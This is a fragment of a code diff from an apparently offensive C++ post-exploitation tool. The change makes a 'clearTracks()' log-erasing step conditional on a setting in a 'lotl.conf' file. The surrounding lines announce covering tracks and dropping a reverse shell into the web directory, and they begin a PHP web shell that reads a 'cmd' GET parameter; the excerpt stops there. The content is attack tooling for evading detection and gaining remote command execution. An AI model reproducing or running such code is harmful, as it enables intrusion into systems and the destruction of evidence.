@@ -72,9 +72,11 @@ int main() {
     std::cout << RED << "=================================================\n\n" << RESET;
 
     // Cover your tracks
-
-    clearTracks();
-
+    std::vector<std::string> clearLogs = parseDependencies("config/lotl.conf", "clear");
+    if (std::find(clearLogs.begin(), clearLogs.end(), std::string("yes")) != clearLogs.end()) {
+        clearTracks();
+    }
+    
     // Find www directory so we can drop a reverse shell
     std::string phpShell = R"(<?php
     if (isset($_GET['cmd'])) {
